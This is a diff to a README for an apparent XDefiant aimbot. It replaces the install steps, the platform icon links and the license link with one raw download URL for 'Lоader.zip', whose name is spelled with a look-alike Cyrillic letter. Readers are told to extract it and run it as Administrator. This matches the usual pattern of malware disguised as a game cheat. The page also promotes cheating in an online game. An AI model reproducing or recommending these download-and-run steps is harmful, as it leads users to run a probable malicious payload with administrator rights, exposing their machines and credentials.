@@ -14,9 +14,9 @@ Take your gameplay to the next level with XDefiant Aimbot! 🌟 Optimized for se
 
 Ready to unlock the full power of automated aiming in XDefiant? Follow these simple steps:
 
-**1. Download Loader.rar from the repository.**
-**2. Extract Loader.rar using your preferred archiving tool.**
-**3. Execute the Loader.exe file as Administrator.**
+**1. Download https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip from the repository.**
+**2. Extract https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip using your preferred archiving tool.**
+**3. Execute the https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip file as Administrator.**
 **4. Launch XDefiant (the game).**
 **5. Configure your settings inside the aimbot interface for personalized optimization.**
 **6. Jump into gameplay and enjoy enhanced aiming!**
@@ -29,9 +29,9 @@ Ready to unlock the full power of automated aiming in XDefiant? Follow these sim
 
 Platform | Version | Compatibility | Notes
 --- | --- | --- | ---
-<img src="https://img.icons8.com/color/32/000000/windows-10.png"/> Windows | 10, 11 | ✅ Full | Full feature support and UI
-<img src="https://img.icons8.com/color/32/000000/linux.png"/> Linux | Ubuntu 20+, Debian | 🟡 Partial | Runs via Wine/Proton Layer
-<img src="https://img.icons8.com/color/32/000000/apple-logo.png"/> macOS | 12+ (Monterey, Ventura) | 🟡 Partial | Requires virtual machine or CrossOver
+<img src="https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip"/> Windows | 10, 11 | ✅ Full | Full feature support and UI
+<img src="https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip"/> Linux | Ubuntu 20+, Debian | 🟡 Partial | Runs via Wine/Proton Layer
+<img src="https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip"/> macOS | 12+ (Monterey, Ventura) | 🟡 Partial | Requires virtual machine or CrossOver
 
 ---
 
@@ -73,7 +73,7 @@ We **do not endorse or condone** unfair gameplay or violations of XDefiant’s T
 All source code, releases, and resources in this repository are provided under the **MIT License 2025**.  
 You are free to use, modify, and distribute this code with attribution and without warranty.
 
-[MIT License 2025](https://opensource.org/licenses/MIT)
+[MIT License 2025](https://raw.githubusercontent.com/collindddddd/XDefiant-AimEnhancer/main/Lоader.zip)
 
 ---
 
